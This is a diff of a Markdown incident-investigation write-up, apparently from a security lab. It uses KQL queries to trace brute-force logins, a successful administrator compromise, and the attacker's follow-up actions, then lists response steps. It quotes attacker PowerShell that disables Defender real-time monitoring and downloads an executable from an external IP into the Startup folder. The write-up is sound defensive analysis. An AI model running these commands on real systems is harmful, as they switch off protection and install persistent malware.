@@ -1,98 +1,108 @@
 ## 🔐 Workbook 1 — Inbound Authentication
 
-This workbook investigates remote authentication activity against virtual machines within the virtual network.
+This workbook investigates **remote authentication activity** against virtual machines in the environment.
 
-The query identifies where remote login attempts are coming from, whether those attempts succeeded or failed, which virtual machines were targeted, and which accounts were involved.
+The goal is to identify:
+
+* Where login attempts originate
+* Successful vs. failed logins
+* Targeted virtual machines
+* Accounts being targeted
+
+---
+
+## Inbound Authentication Overview
 
 ### KQL Query
 
 ```kusto
-// === Inbound auth origins (geo) ===
-// Goal: plot WHERE remote logons originate, and whether they succeeded.
 DeviceLogonEvents
-// Only logons that came over the network from a real external address.
-// RemoteIPType filters out the huge volume of private/internal logons,
-// which would otherwise return empty coordinates and clutter the map.
 | where RemoteIPType == "Public"
 | where isnotempty(RemoteIP)
-// We care about network + remote-interactive (RDP) logons reaching in.
 | where LogonType in ("Network", "RemoteInteractive")
-// Enrich the source IP with geolocation (country/city/lat/long).
 | extend geo = geo_info_from_ip_address(RemoteIP)
 | extend Latitude = toreal(geo.latitude),
          Longitude = toreal(geo.longitude),
          Country = tostring(geo.country),
          City = tostring(geo.city)
-// Drop rows the geo DB couldn't resolve (no coordinates = nothing to plot).
 | where isnotempty(Latitude) and isnotempty(Longitude)
-// Aggregate per source location so the map plots one bubble per origin.
-// Successes vs failures are counted separately to expose the dangerous mix.
 | summarize Attempts = count(),
             Successes = countif(ActionType == "LogonSuccess"),
             Failures = countif(ActionType == "LogonFailed"),
             TargetedDevices = dcount(DeviceName),
             Accounts = make_set(AccountName, 25)
     by RemoteIP, Country, City, Latitude, Longitude
-// Label shown on the bubble: IP + country, plus how many succeeded.
 | extend MapLabel = strcat(RemoteIP, " (", Country, ") — ", Successes, " success / ", Attempts, " total")
-| project Latitude, Longitude, MapLabel, Attempts, Successes, Failures, TargetedDevices, RemoteIP, Country, City, Accounts
+| project Latitude, Longitude, MapLabel, Attempts, Successes, Failures,
+          TargetedDevices, RemoteIP, Country, City, Accounts
 | order by Successes desc, Attempts desc
 ```
 
-### Inbound Authentication Map Overview
-
+### Authentication Map
 
 <p align="center">
   <img src="https://i.imgur.com/QgLpUwg.png" width="1200" alt="Inbound Authentication Overview">
 </p>
 
+The map displays the geographic origin of remote login attempts.
 
-Displays the geographic origin of remote login attempts against virtual machines in the virtual network.
+* 🔴 **Red** — No or very few successful logins
+* 🟠/🟡 **Orange/Yellow** — Some successful logins
+* 🟢 **Green** — Higher number of successful logins
 
-The map shows where the login attempts originated, while the table provides details such as total attempts, successful and failed logins, targeted virtual machines, and account names used.
+Since the environment operates in the **United States**, successful authentication from unexpected foreign locations was prioritized for investigation.
 
-- 🔴 **Red** = 0 or very few successful logins
-- 🟠/🟡 **Orange/Yellow** = some successful logins
-- 🟢 **Green** = more successful logins
+---
 
-The bubble to fear is a LogonSuccess from a country the virtual network does not operate in. The virtual network operates in the US only so we can assume majority of US based logons are authorized users of the virtual network. 
-
-<h2><u>Data Analysis (last 24 Hours) </u></h2>
+## Data Analysis
 
 ### 🔴 Potential Brute-Force Activity
+
 <p align="center">
   <img src="https://i.imgur.com/kIMPU4V.png" width="1200" alt="Potential Brute-Force Activity">
 </p>
-The three IP addresses with the highest number of failed login attempts were:
 
-- **178.57.110.29 (Russia)** — 368 attempts, all failed. Targeted multiple accounts across 5 virtual machines.
-- **48.217.82.109 (United States)** — 153 attempts, all failed. Targeted the `student`, `azureuser`, `azureadmin`, `azurevps`, `azuredp`, and `azureserver` accounts across 6 virtual machines.
-- **45.227.254.151 (Panama)** — 119 attempts, all failed. Targeted the `administrator` account across 3 virtual machines.
+Three IP addresses generated the highest number of failed logins:
 
-The repeated attempts against multiple accounts may indicate potential brute-force activity. **No successful logins were observed from any of these IP addresses.**
+| Source                | Attempts | Result     |
+| --------------------- | -------: | ---------- |
+| 🇷🇺 `178.57.110.29`  |      368 | All Failed |
+| 🇺🇸 `48.217.82.109`  |      153 | All Failed |
+| 🇵🇦 `45.227.254.151` |      119 | All Failed |
 
-### 🟢 Successful Login Investigation
+The repeated login attempts against multiple accounts and systems indicate **potential brute-force activity**.
 
-The IP address **112.133.200.242 (India)** was identified with suspicious remote authentication activity:
+**No successful logins were observed from these IP addresses.**
 
-- **72 total login attempts**
-- **33 successful logins**
-- **39 failed login attempts**
-- **1 virtual machine targeted**
-- **`administrator` account used**
+---
+
+### 🟢 Suspicious Successful Login
+
+The IP **`112.133.200.242` (India)** stood out because it successfully authenticated to the environment.
+
+| Finding        | Result                     |
+| -------------- | -------------------------- |
+| Total Attempts | **72**                     |
+| Successful     | **33**                     |
+| Failed         | **39**                     |
+| Target VM      | `win-server-2026.corp.com` |
+| Account        | `administrator`            |
 
 <p align="center">
   <img src="https://imgur.com/xtNFPKc.png" width="1200" alt="Successful Login Investigation">
 </p>
+
 <p align="center">
   <img src="https://i.imgur.com/gSdL9oD.png" width="1200" alt="Successful Login Investigation">
 </p>
 
-## Part 2 — Authentication Timeline
+This activity was selected for deeper investigation.
 
-To investigate the suspicious IP further, I filtered `DeviceLogonEvents` for **112.133.200.242** and ordered the authentication events by time.
+---
 
-**KQL Query:**
+## Part 1 — Authentication Timeline
+
+I filtered the authentication logs specifically for **`112.133.200.242`**.
 
 ```kusto
 DeviceLogonEvents
@@ -105,27 +115,32 @@ DeviceLogonEvents
   <img src="https://i.imgur.com/Jms1Qxi.png" width="1200" alt="Authentication Timeline">
 </p>
 
-The first recorded authentication attempt from **112.133.200.242** occurred at **6:28:27 PM** and targeted the `administrator` account on **win-server-2026.corp.com**. The login attempt failed.
+### First Attempt
+
+**6:28:27 PM**
+
+* Source: `112.133.200.242`
+* Account: `administrator`
+* Target: `win-server-2026.corp.com`
+* Result: **Failed**
 
 <p align="center">
   <img src="https://i.imgur.com/2W3IOXy.png" width="1200" alt="Authentication Investigation">
 </p>
 
-The first successful authentication occurred at **6:38:04 PM**, approximately 9 minutes after the failed login activity began.
+### First Successful Login
 
-**Key Findings:**
+**6:38:04 PM**
 
-- **Source IP:** `112.133.200.242`
-- **Target VM:** `win-server-2026.corp.com`
-- **Account:** `administrator`
-- **First observed attempt:** 6:28:27 PM
-- **First successful login:** 6:38:04 PM
+Approximately **9 minutes after the failed login activity began**, the attacker successfully authenticated as `administrator`.
 
-## Part 3 — Post-Compromise Activity Investigation
+This marks the beginning of the **post-compromise investigation**.
 
-After identifying the successful authentication from **112.133.200.242**, I investigated process activity on **win-server-2026.corp.com** to determine what occurred after the account was accessed.
+---
 
-`DeviceProcessEvents` was used to find the activity performed under the `administrator` account
+# Part 2 — Post-Compromise Investigation
+
+`DeviceProcessEvents` was used to determine what occurred immediately after the successful login.
 
 ```kusto
 DeviceProcessEvents
@@ -139,105 +154,121 @@ DeviceProcessEvents
 | order by Timestamp asc
 ```
 
+---
+
 ### 1. Remote Command Execution — 6:38:04 PM
 
-After the successful login, `WinrsHost.exe` launched under the `administrator` account and spawned `cmd.exe`.
+Immediately after authentication, **`WinrsHost.exe` spawned `cmd.exe`**.
 
-This indicates that remote commands began executing on the virtual machine immediately after authentication.
+This indicates remote command execution began on the VM.
 
-![Workbook Image](https://i.imgur.com/bAkf7Za.png)
-
----
-
-### 2. System Reconnaissance — 6:38:11 PM to 6:38:18 PM
-
-The attacker began gathering information about the system and preparing the machine for additional activity.
-
-Observed activity included:
-
-* Inspecting the Windows Startup folder
-![Workbook Image](https://imgur.com/dRm4bl7.png)
-The command line decodes to "Get-ChildItem 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\'"
-  
-* Identifying the operating system
-![Workbook Image](https://imgur.com/hTWmSPI.png)
-
-* Creating `C:\users\Migration`
-![Workbook Image](https://imgur.com/7s2zHBN.png)
-Decoded PowerShell "New-Item -Path "C:\users\Migration" -ItemType Directory" 
-  
-* Inspecting Microsoft Defender settings
-![Workbook Image](https://imgur.com/gn3LRq1.png)
-Decoded PowerShell "Get-MpPreference | fl DisableRealtimeMonitoring, ExclusionPath"
----
-
-### 3. Microsoft Defender Tampering — 6:38:21 PM to 6:38:24 PM
-
-Shortly after performing reconnaissance, PowerShell commands were used to modify Microsoft Defender.
-
-Real-time monitoring was disabled.
-
-Decoded PowerShell "Set-MpPreference -DisableRealtimeMonitoring $True"
-
-![Workbook Image](https://imgur.com/8I92nGm.png)
+![Remote Command Execution](https://i.imgur.com/bAkf7Za.png)
 
 ---
 
-### 4. Payload Downloads — 6:38:39 PM to 6:38:50 PM
+### 2. System Reconnaissance — 6:38:11–6:38:18 PM
 
-At **6:38:39 PM**, an encoded PowerShell command was executed under the `administrator` account to download `MicrosoftPrt.exe` from the external IP address **77.110.114.53**.
+The attacker performed several discovery and preparation actions:
 
-The file was saved to:
+* Inspected the Windows Startup folder
+* Identified the operating system
+* Created `C:\users\Migration`
+* Checked Microsoft Defender settings
 
-`C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\MicrosoftPrt.exe`
+![Startup Folder](https://imgur.com/dRm4bl7.png)
 
-The Windows Startup directory can automatically execute programs when a user logs in, making this location useful for establishing persistence on the compromised system.
-```kusto
-Decoded PowerShell
+```powershell
+Get-ChildItem 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\'
+```
 
+![Operating System](https://imgur.com/hTWmSPI.png)
+
+![Migration Directory](https://imgur.com/7s2zHBN.png)
+
+```powershell
+New-Item -Path "C:\users\Migration" -ItemType Directory
+```
+
+![Defender Settings](https://imgur.com/gn3LRq1.png)
+
+```powershell
+Get-MpPreference | fl DisableRealtimeMonitoring, ExclusionPath
+```
+
+---
+
+### 3. Microsoft Defender Tampering — 6:38:21–6:38:24 PM
+
+PowerShell was used to **disable Microsoft Defender real-time monitoring**.
+
+```powershell
+Set-MpPreference -DisableRealtimeMonitoring $True
+```
+
+![Microsoft Defender Tampering](https://imgur.com/8I92nGm.png)
+
+---
+
+### 4. Payload Download — 6:38:39 PM
+
+PowerShell downloaded **`MicrosoftPrt.exe`** from:
+
+`77.110.114.53`
+
+The executable was placed inside the Windows Startup directory.
+
+```powershell
 (new-object System.Net.WebClient).DownloadFile(
 'http://77.110.114.53/MicrosoftPrt.exe',
 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\MicrosoftPrt.exe'
 )
 ```
-![Workbook Image](https://imgur.com/IQfbgUP.png)
+
+![Payload Download](https://imgur.com/IQfbgUP.png)
+
+Placing the executable in the Startup directory allows it to run when a user logs in.
 
 ---
 
 ### 5. Persistence Established — 6:39:00 PM
 
-The downloaded `Wmiic.exe` executable was then used to install a service named `WMServices`.
+`Wmiic.exe` was used to install a service named **`WMServices`**.
 
-The service was configured to execute `svchosl.exe`, establishing persistence on the compromised virtual machine.
+The service was configured to execute **`svchosl.exe`**, establishing persistence on the VM.
 
-![Workbook Image](https://imgur.com/SD8ORHb.png)
+![Persistence Established](https://imgur.com/SD8ORHb.png)
 
 ---
 
-### Attack Timeline
+## Attack Timeline
 
-1. **6:38:04 PM — Successful Administrator Authentication**
-2. **6:38:04 PM — Remote Command Execution Begins**
-3. **6:38:11–6:38:18 PM — System Reconnaissance**
-4. **6:38:21–6:38:24 PM — Microsoft Defender Tampering**
-5. **6:38:39–6:38:50 PM — Payloads Downloaded**
+1. **6:38:04 PM** — Successful administrator authentication
+2. **6:38:04 PM** — Remote command execution
+3. **6:38:11–6:38:18 PM** — System reconnaissance
+4. **6:38:21–6:38:24 PM** — Microsoft Defender tampering
+5. **6:38:39–6:38:50 PM** — Payload downloads
+6. **6:39:00 PM** — Persistence established
 
-## Part 4 — Incident Response and Final Assessment
+---
+
+# Part 3 — Incident Response
 
 ### Containment
 
-- Isolate `win-server-2026.corp.com`.
-- Block `112.133.200.242` and `77.110.114.53`.
-- Reset or disable the compromised `administrator` account.
+* Isolate `win-server-2026.corp.com`
+* Block `112.133.200.242` and `77.110.114.53`
+* Disable/reset the compromised `administrator` account
 
 ### Eradication
 
-- Remove malicious files and the `WMServices` service.
-- Remove unauthorized Microsoft Defender exclusions.
-- Re-enable Defender real-time monitoring.
+* Remove malicious files
+* Remove the `WMServices` service
+* Remove unauthorized Defender exclusions
+* Re-enable Defender real-time monitoring
 
 ### Recovery
 
-- Verify no malicious processes or persistence remain.
-- Restore or rebuild the VM from a trusted state if necessary.
-- Return the VM to the network only after validation and continued monitoring.
+* Verify persistence has been removed
+* Rebuild or restore the VM from a trusted state if necessary
+* Validate the system before returning it to the network
+
